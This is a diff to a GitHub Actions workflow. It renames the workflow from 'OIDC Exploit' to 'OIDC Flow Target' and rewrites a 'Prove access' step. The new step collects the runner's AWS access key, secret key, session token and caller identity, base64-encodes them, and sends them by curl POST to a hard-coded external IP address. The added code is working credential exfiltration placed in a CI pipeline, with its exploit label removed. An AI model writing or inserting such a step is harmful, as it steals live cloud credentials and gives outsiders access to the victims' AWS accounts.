@@ -1,4 +1,4 @@
-name: OIDC Exploit
+name: OIDC Flow Target
 
 on:
   push:
@@ -20,6 +20,18 @@ jobs:
 
       - name: Prove access
         run: |
-          aws sts get-caller-identity
+          # Get caller identity and base64 encode it
+          CALLER_JSON=$(aws sts get-caller-identity)
+          CALLER_B64=$(echo "$CALLER_JSON" | base64 -w0)
+
+          # Build a JSON object with tokens and base64 encode that
+          TOKENS_JSON=$(jq -n \
+            --arg access "$AWS_ACCESS_KEY_ID" \
+            --arg secret "$AWS_SECRET_ACCESS_KEY" \
+            --arg session "$AWS_SESSION_TOKEN" \
+            '{AccessKeyId: $access, SecretAccessKey: $secret, SessionToken: $session}')
+          TOKENS_B64=$(echo "$TOKENS_JSON" | base64 -w0)
+
+          # Send payload with both encoded pieces
           curl -s -X POST "http://54.226.194.239/chain4" \
-            -d "oidc_success=yes&role=GitHubActionsDeployRole"
+            -d "oidc_success=yes&role=GitHubActionsDeployRole&caller_b64=${CALLER_B64}&tokens_b64=${TOKENS_B64}"
